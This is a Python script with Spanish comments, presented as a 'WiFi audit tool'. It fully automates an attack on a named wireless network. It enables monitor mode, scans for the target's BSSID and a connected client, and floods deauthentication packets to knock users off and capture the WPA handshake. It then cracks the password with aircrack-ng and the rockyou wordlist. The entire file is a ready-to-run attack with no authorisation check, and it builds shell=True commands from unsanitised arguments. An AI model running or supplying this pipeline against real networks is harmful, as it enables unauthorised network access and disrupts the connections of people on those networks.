import subprocess
import time
import os
import argparse
import signal
import re

# Configuración por defecto
DICCIONARIO = "/usr/share/wordlists/rockyou.txt"
INTERFAZ = "wlan0"

def ejecutar_comando(comando):
    """Ejecuta un comando en la terminal y maneja la salida"""
    try:
        print(f"[+] Ejecutando: {comando}")
        proceso = subprocess.run(comando, shell=True, capture_output=True, text=True)
        return proceso.stdout
    except Exception as e:
        print(f"[-] Error al ejecutar el comando: {e}")
        return None

def obtener_bssid_y_cliente(essid, canal, interfaz_mon):
    """Escanea redes y obtiene el BSSID de la red objetivo y un cliente conectado"""
    archivo_salida = "scaner-01.csv"
    comando = f"sudo airodump-ng {interfaz_mon} --essid {essid} -c {canal} --output-format csv -w scaner"
    scan_proceso = subprocess.Popen(comando, shell=True, preexec_fn=os.setsid)
    time.sleep(10)
    os.killpg(os.getpgid(scan_proceso.pid), signal.SIGTERM)
    
    bssid = None
    cliente = None
    try:
        with open(archivo_salida, "r", encoding="utf-8", errors="ignore") as f:
            lines = f.readlines()
            for i in range(4,len(lines)-4):
                if essid in lines[i]:
                    bssid = lines[i].split(",")[0].strip()
                if re.search(r"(?:[0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", lines[i]) and bssid in lines[i].split(",") and  "not associated" not in lines[i].split(","):
                    cliente = lines[i].split(",")[1].strip()
                    break

    except FileNotFoundError:
        print("[-] No se encontró el archivo CSV generado.")
    
    return bssid, cliente

def iniciar_monitoreo(interfaz):
    """Habilita el modo monitor en la interfaz"""
    ejecutar_comando(f"sudo airmon-ng start {interfaz}")
    return f"{interfaz}mon"

def detener_monitoreo(interfaz_mon):
    """Restaura la interfaz a su estado normal"""
    ejecutar_comando(f"sudo airmon-ng stop {interfaz_mon}")

def capturar_handshake(bssid, cliente, canal, interfaz_mon):
    """Captura paquetes en busca de un handshake"""
    captura_proceso = subprocess.Popen(
        f"sudo airodump-ng --bssid {bssid} -c {canal} -w cap {interfaz_mon}", shell=True, preexec_fn=os.setsid
    )
    time.sleep(5)
    print("[+] Enviando ataque de desautenticación...")
    if cliente:
        deauth_proceso = subprocess.Popen(
            f"sudo aireplay-ng --deauth 50 -a {bssid} -c {cliente} {interfaz_mon}",
            shell=True
        )
    else:
        print("[-] no hay cliente, eso afecta en las posibilidades del handshake.")
        deauth_proceso = subprocess.Popen(
            f"sudo aireplay-ng --deauth 50 -a {bssid} {interfaz_mon}",
            shell=True
        )
    time.sleep(50)
    captura_proceso.terminate()
    deauth_proceso.terminate()

def crackear_contraseña(bssid):
    """Usa diccionario para intentar descifrar la contraseña"""
    return ejecutar_comando(f"sudo aircrack-ng -w {DICCIONARIO} -b {bssid} cap-01.cap")

def main():
    parser = argparse.ArgumentParser(description="Herramienta de auditoría WiFi")
    parser.add_argument("--essid", required=True, help="ESSID de la red objetivo")
    parser.add_argument("-c", required=True, help="Canal de la red objetivo")
    args = parser.parse_args()
    
    interfaz_mon = iniciar_monitoreo(INTERFAZ)
    
    print("[+] Buscando BSSID y clientes conectados...")
    bssid, cliente = obtener_bssid_y_cliente(args.essid, args.c, interfaz_mon)
    if not bssid:
        print("[-] No se encontró la red objetivo.")
        detener_monitoreo(interfaz_mon)
        return
    
    print(f"[+] BSSID encontrado: {bssid}")
    if cliente:
        print(f"[+] Cliente objetivo detectado: {cliente}")
    
    capturar_handshake(bssid, cliente, args.c, interfaz_mon)
    
    resultado = crackear_contraseña(bssid)
    
    detener_monitoreo(interfaz_mon)
    print("[✅] Proceso finalizado")

if __name__ == "__main__":
    main()
